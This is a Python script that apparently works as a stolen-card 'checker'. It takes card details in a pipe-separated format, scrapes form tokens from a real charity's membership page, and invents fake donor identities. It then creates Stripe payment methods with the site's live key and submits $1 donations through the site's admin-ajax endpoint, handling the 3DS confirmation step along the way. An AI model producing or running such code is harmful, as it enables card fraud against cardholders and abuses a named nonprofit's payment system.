import random
import string
import requests
from user_agent import generate_user_agent
import json
import time
import re
from bs4 import BeautifulSoup

# ------------------ Helper functions (unchanged) ------------------
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# ------------------ Main function with fixed SCA detection ------------------
def Tele(ccx):
    # 1. Parse card
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) != 4:
        return "Invalid card format"
    n, mm, yy, cvc = parts

    # Normalize month/year
    if "20" in yy:
        yy = yy.split("20")[1]
    if mm.startswith("0"):
        mm = mm[1]

    # 2. Create a session
    session = requests.Session()
    session.verify = False

    # 3. Fetch the donation page to get nonce and entry hash
    try:
        page = session.get("https://www.siaprojects.org/become-a-member/")
        soup = BeautifulSoup(page.text, "html.parser")
        nonce_input = soup.find("input", {"name": "_fluentform_15_fluentformnonce"})
        nonce = nonce_input.get("value") if nonce_input else "5b0254df82"
        hash_input = soup.find("input", {"name": "__entry_intermediate_hash"})
        entry_hash = hash_input.get("value") if hash_input else "45f911f25572031052b307ec4cbc1189"
    except Exception as e:
        print(f"[DEBUG] Failed to extract page data: {e}")
        nonce = "5b0254df82"
        entry_hash = "45f911f25572031052b307ec4cbc1189"

    # 4. Generate random personal data
    first_name, last_name = generate_full_name()
    address_line1, city, country_code, zip_code, phone = generate_address()
    email = generate_email()

    # 5. Create Stripe PaymentMethod
    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    stripe_data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4cd120cf9f%3B+stripe-js-v3%2F4cd120cf9f%3B+card-element&referrer=https%3A%2F%2Fwww.siaprojects.org&key=pk_live_51MR3wSHEoKUO3mGVIj1JOGRPI0VK51TfIjUyHxNMlHRCU5IVhkqMFfl2WHbRLlstNp718Dpz6X6WFohnJHg9d3qa00NFUjJSss'
    
    resp_stripe = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
    try:
        pm = resp_stripe.json()['id']
    except:
        return "Stripe error: " + resp_stripe.text

    # 6. Build the donation form submission data
    form_data = {
        'data': f'__fluent_form_embded_post_id=122&_fluentform_15_fluentformnonce={nonce}&_wp_http_referer=%2Fbecome-a-member%2F&names%5Bfirst_name%5D={first_name}&names%5Blast_name%5D={last_name}&email={email}&phone={phone}&payment_input=Custom%20Amount&custom-payment-amount=1&payment_method=stripe&address_1%5Baddress_line_1%5D={address_line1.replace(" ", "%20")}&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D={city.replace(" ", "%20")}&address_1%5Bstate%5D={random.choice(["New York", "California", "Texas"])}&address_1%5Bzip%5D={zip_code}&address_1%5Bcountry%5D=US&description=&__entry_intermediate_hash={entry_hash}&__stripe_payment_method_id={pm}',
        'action': 'fluentform_submit',
        'form_id': '15',
    }

    # 7. Set admin-ajax headers
    admin_headers = {
        'authority': 'www.siaprojects.org',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.siaprojects.org',
        'referer': 'https://www.siaprojects.org/become-a-member/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    # 8. First POST to admin-ajax
    t1 = str(int(time.time() * 1000))
    resp1 = session.post(
        'https://www.siaprojects.org/wp-admin/admin-ajax.php',
        params={'t': t1},
        headers=admin_headers,
        data=form_data,
    )
    response_text = resp1.text
    print(f"[DEBUG] First response: {response_text[:200]}")

    # 9. Check for SCA/3DS
    try:
        data1 = resp1.json()
        if isinstance(data1, dict):
            # Check if response indicates SCA
            sca_detected = False
            payment_intent_id = None
            submission_id = None

            # Case 1: Old format (sca_required or payment_intent_id)
            if data1.get('data') and isinstance(data1['data'], dict):
                inner = data1['data']
                if inner.get('action') == 'sca_required' or inner.get('payment_intent_id'):
                    sca_detected = True
                    payment_intent_id = inner.get('payment_intent_id')
                    submission_id = inner.get('submission_id')
                # Case 2: New format (initStripeSCAModal)
                elif inner.get('actionName') == 'initStripeSCAModal':
                    sca_detected = True
                    client_secret = inner.get('client_secret')
                    if client_secret and '_secret_' in client_secret:
                        payment_intent_id = client_secret.split('_secret_')[0]
                    submission_id = inner.get('submission_id')
                # Also check top-level for client_secret (rare)
            if not sca_detected and data1.get('data') and isinstance(data1['data'], dict):
                # fallback: if we see client_secret directly in data
                inner = data1['data']
                if inner.get('client_secret'):
                    sca_detected = True
                    client_secret = inner.get('client_secret')
                    if '_secret_' in client_secret:
                        payment_intent_id = client_secret.split('_secret_')[0]
                    submission_id = inner.get('submission_id')

            if sca_detected and payment_intent_id and submission_id:
                print("[DEBUG] SCA required. Confirming payment...")
                t2 = str(int(time.time() * 1000))
                confirm_data = {
                    'action': 'fluentform_sca_inline_confirm_payment',
                    'form_id': '15',
                    'payment_method': pm,
                    'payment_intent_id': payment_intent_id,
                    'submission_id': str(submission_id),
                    'type': 'handleCardAction',
                }
                resp2 = session.post(
                    'https://www.siaprojects.org/wp-admin/admin-ajax.php',
                    params={'t': t2},
                    headers=admin_headers,
                    data=confirm_data,
                )
                response_text = resp2.text
                print(f"[DEBUG] Second response: {response_text[:200]}")
    except (ValueError, KeyError, TypeError) as e:
        print(f"[DEBUG] SCA check error: {e}")

    return response_text